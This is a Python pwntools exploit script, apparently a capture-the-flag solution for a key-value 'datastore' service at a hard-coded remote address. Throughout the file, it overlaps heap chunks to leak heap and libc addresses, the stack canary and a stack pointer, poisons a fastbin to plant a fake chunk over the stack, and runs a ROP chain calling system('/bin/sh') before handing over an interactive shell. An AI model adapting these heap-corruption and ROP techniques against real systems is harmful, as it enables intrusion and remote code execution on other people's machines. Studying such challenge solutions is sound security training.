#!/usr/bin/env python

from pwn import *  # pip install pwntools

ip = '52.4.86.204' 

r = remote(ip, 64613)
#r = process("./datastore")

def PUT(k, d):
  r.recvuntil('Enter command:')
  r.send('PUT\n')
  r.recvuntil('Enter row key:')
  r.send(k+'\n')
  r.recvuntil('Enter data size:')
  r.send(str(len(d))+'\n')
  r.recvuntil('PROMPT: Enter data:')
  r.send(d)

def DEL(k):
  r.recvuntil('Enter command:')
  r.send('DEL\n')
  r.recvuntil('Enter row key:')
  r.send(k+'\n')

def GET(k):
  r.recvuntil('Enter command:')
  r.send('GET\n')
  r.recvuntil('Enter row key:')
  r.send(k+'\n')
  r.recvuntil(' bytes]:\n')
  return r.recvuntil('PROMPT: ')[:-8]

# Overwrite the size of nextchunk and free it to make chunks overlap
PUT('MMAP', 'Z'*0x21000)
PUT('3', '') 
PUT('0', 'C'*128)
PUT('1', '')
PUT('2', '')
PUT('1', 'A'*248)
PUT('2', 'B'*248 + p64(0x21) + 'C'*16 + p64(1)) 
DEL('1')
DEL('X'*240 + p64(752))
DEL('0')
DEL('2')

# Data buffer of KK and node structure of LEAKBUF is overlapping
DEL('3')
PUT('3', ('A'*264 + 
  p64(64) + p64(0) + 'D'*48 + p64(33) + p64(0) + 'C'*16 + p64(33) + 'KK\x00'
).ljust(1000, '\x01'))
PUT('LEAKBUF', '')

kk = GET('KK')
heap = u64(kk[272:280])-0x150
print 'heap =', hex(heap) 

# An leaker function for information leakage
def leak(addr, sz):
  PUT('KK', 'A'*1000)
  PUT('KK', kk[:280] + p64(sz) + p64(addr) + kk[296:])
  return GET('LEAKBUF')

# The fist mmapped chunk is just before .tls
# Leak some useful information from .tls
mmap_chunk = u64(leak(heap + 0xa0, 8)) - 0x10
base = u64(leak(mmap_chunk + 0x22000 + 1792, 8)) - 0x3be760 # libc base, by main_arena - offset
print 'base =', hex(base)
canary = u64(leak(mmap_chunk + 0x22000 + 1896, 8)) # stackguard canary 
print 'canary =', hex(canary)
stack = u64(leak(mmap_chunk + 0x22000 + 2624, 8)) # a pointer to somewhere on stack (no idea what it is)
print 'stack =', hex(stack)

# These offsets can be fetched by debbuger and from libc
chunk = stack - 144
pop_rdi = base + 0x22b1a
leave = base + 0x39b4e
system = base + 0x46640
sh = base + 0x17ccdb

# Since the fake chunk is not large enough
# The rop chain have to be migrate: rop (stack) -> rop2 (heap)
new_rbp = heap + 1056 - 8
rop = p64(new_rbp) + p64(leave)
rop2 = p64(pop_rdi) + p64(sh) + p64(system)


# Corrupt the fastbin (size=64)
# DEL node C (overwritted by PUT KK) and overwrite C->fd by PUT kk again
# Some entries should be set to correct value to pass the checking in other operations
PUT('KK', 'A'*1000)
PUT('KK', ('A'*264 + 
  p64(64) + p64(heap+992) + p64(100) + p64(0) + p64(0) + p64(0) + p64(0) + 
  p64(64) + p64(64) + 'KK' + '\x00' +
  'A'*53 + p64(64) + 'A'*120 + p64(64) + 
  'C\x00'.ljust(56) + p64(65)).ljust(1000, '\x01'))
DEL('C')
DEL('KK')
PUT('KK', ('A'*264 + 
  p64(64) + p64(heap+992) + p64(100) + p64(0) + p64(0) + p64(0) + p64(0) + 
  p64(64) + p64(64) + p64(chunk) +
  'A'*48 + p64(64) + 'A'*120 + p64(64) + 
  'A'*64 + rop2).ljust(1000, '\x01'))

# Get the fake chunk back. The size the chunk should be set correctly
# The fake chunk overwite the return address of current stack frame
r.recvuntil('Enter command:')
r.send('PUT\n')
r.recvuntil('Enter row key:')
r.send('KK\n')
r.recvuntil('Enter data size:')
r.send('56'.ljust(8) + p64(66)) # set chunk is_mapped to bypass ar_ptr==main_arena checking
r.recvuntil('PROMPT: Enter data:')
r.send('AAAAAAA' + p64(canary) + 'A'*16 + rop + 'A'*8)
r.recvuntil('INFO: Update successful.\n')

r.interactive()

